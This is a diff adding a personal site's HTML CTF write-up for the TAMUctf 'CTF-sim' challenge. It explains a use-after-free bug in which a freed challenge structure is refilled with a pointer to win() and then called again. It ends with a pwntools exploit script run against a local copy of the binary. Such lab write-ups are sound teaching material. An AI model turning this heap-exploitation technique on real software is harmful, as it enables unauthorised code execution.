@@ -1,0 +1,212 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<link rel="stylesheet" href="/w3css/3/w3.css">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.6.3/css/font-awesome.min.css">
+<style>
+  
+ul {
+  list-style-type: none;
+  margin: 0;
+  padding: 0;
+  overflow: hidden;
+  background-color: #cecece;
+}
+
+img{
+	border-radius: 8px;
+	display: block;
+  	margin-left: auto;
+  	margin-right: auto;
+	width: 100%;
+	max-width: 300px;
+}
+.writeup{
+  width: 100%;
+  max-width: 750px;
+  padding: 10px;
+  border: 5px solid gray;
+  border-style: dotted solid;
+  margin-left: auto;
+  margin-right: auto;
+	
+}
+ul.ingredients {
+  list-style-type: circle;
+}
+	
+li {
+  float: left;
+}
+
+li.ingredients{
+	text-align: left;
+	}
+li a, .dropbtn   {
+  display: inline-block;
+  color: white;
+  text-align: center;
+  padding: 14px 16px;
+  text-decoration: none;
+}
+
+li a:hover, .dropdown:hover .dropbtn {
+  background-color: grey;
+}
+
+li.dropdown {
+  display: inline-block;
+}
+
+.dropdown-content {
+  display: none;
+  position: absolute;
+  background-color: silver;
+  min-width: 160px;
+  box-shadow: 0px 8px 16px 0px rgba(0,0,0,0.2);
+  z-index: 1;
+}
+
+.dropdown-content a {
+  color: black;
+  padding: 12px 16px;
+  text-decoration: none;
+  display: block;
+  text-align: left;
+}
+
+.dropdown-content a:hover {background-color: #f1f1f1;}
+
+.dropdown:hover .dropdown-content {
+  display: block;
+}
+
+h1{
+   text-align:center;
+   -webkit-text-decoration-line: overline underline; /* Safari */
+   text-decoration-line: overline underline;
+}
+h2{
+   text-decoration-line: underline;
+}
+
+	
+</style>
+</head>
+<body>
+ 
+ <ul>
+  <li><a class="active" href="../index.html">Home</a></li>
+  <li class="dropdown">
+  	<a href="javascript:void(0)" class="droptn">Menu</a>
+  	<div class="dropdown-content">
+		<a href="../docs/CTF-writeup.html">CTF Writeups</a>
+		<a href="#binaryexploitation">Binary Exploitation</a>
+		<a href="#poemsandstories">Poems and Short Stories</a>
+		<a href="../docs/food.html">Food</a>
+	</div>
+  </li>
+
+  <li><a href="../docs/about.html">About</a></li>
+  
+ </ul>
+<p>     </p>
+<p>     </p>
+<img src="../../images/tamuctf.jpg" width="350" height="263" alt="void">
+<p>     </p>
+<div class="writeup">
+	<h1> CTF-sim</h1>
+	<h2> Points: 356</h2>
+		<p> This was a uaf based challenge that I solved after the CTF. I'll now take you through it. </p>
+
+	<h2> Preliminary Analysis: </h2>
+   <blockquote><code>
+ctf_sim: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=2761071c48f75292676a4dabec103db701a4cee3, not stripped <br><br>
+      </code>
+	<code>
+Canary                        : ✘ 
+NX                            : ✓ 
+PIE                           : ✘ 
+Fortify                       : ✘ 
+RelRO                         : Partial
+gef➤  
+
+	   </code>
+	</blockquote>
+
+
+<p> As we can see, only NX bit is enabled, and it is a 64-bit dynamically linked binary. Let us move onto analyzing the binary.<br>
+
+As we run the binary, we see 4 options - download challenge, solve challenge, submit writeup for challenge, and exit. </p>
+<blockquote>
+  <code>```<br>
+    CTF SIM<br>
+1. Download a Challenge<br>
+2. Solve a Challenge<br>
+3. Submit a writeup<br>
+4. Quit<br>
+> <br>```
+    <br></code></blockquote>
+  
+	<h2> Analysis </h2>
+
+
+<p>The following functions:<br>
+
+  1. <code>`download challenge()`</code> provides us a choice to choose one of the categories, (all the challenges are structures which contain a function), and saves it into a downloaded array, however the maximum index we can reach is 3, which means we can download atmost 3 challenges.<br>
+  2. <code>`solve challenge()`</code> calls the fucntion solve of the structure, and then frees the allocated area of the structure. Libc version used is: ldd (Ubuntu GLIBC 2.31-0ubuntu9.7) 2.31. One thing to notice here is that, we can reuse the same chunk by requesting a chunk of the same size. After freeing it, we can reuse to point to win, thus when the function solve() is called again inside the structure, the pointer to win() will call the win() function instead. This cane be seen from the line: downloaded[index] -> solve(); Hence making use of the UAF bug available.<br>
+  3. <code>`submit writeup()`</code> takes input from the reader. Here, we submit a writeup of 16 bytes, and provide the pointer to win() function as our payload. <br></p>
+  
+<p>Thus our process involves:<br>
+
+  1. <code></code>download a challenge, store it at any index.<br>
+  2. <code></code>solve the challenge download, so as to free the allocated area of the strcture.<br>
+  3. <code></code>submit writeup for the solved challenge, (providing a pointer to win() as the paylaod so that, when solve() function is called again, win() will be called instead.)<br>
+  4. <code></code>solve the same downloaded and freed challenge again, so as to call win() this time.<br></p>
+
+<h2> Exploit </h2>
+<blockquote><code>
+```<br>
+def download(cat, ind):<br>
+	p.recv()<br>
+	p.sendline('1')<br>
+	p.sendline(bytes(cat))<br>
+	p.sendline(bytes(ind))<br>
+<br>
+def solve_chall(ind):<br>
+	p.recv()<br>
+	p.sendline('2')<br>
+	p.sendline(bytes(ind))<br>
+	<br>
+def writeup(length, content):<br>
+	p.recv()<br>
+	p.sendline('3')<br>
+	p.sendline(bytes(length))<br>
+	p.sendline(content)<br>
+<br>
+from pwn import *<br>
+<br>
+#p = remote("tamuctf.com", 443, ssl=True, sni="ctf-sim")<br>
+p = process('./ctf_sim')<br>
+gdb.attach(p)<br>
+win_ptr = 0x404088<br>
+<br>
+download(1, 1)<br>
+<br>
+solve_chall(1)<br>
+<br>
+pay = p64(win_ptr)<br>
+writeup(16, pay)<br>
+<br>
+solve_chall(1)	<br>
+<br>
+p.interactive()<br>
+```<br>
+	</code></blockquote>
+
+			
+</div>			
+</body>
+</html>
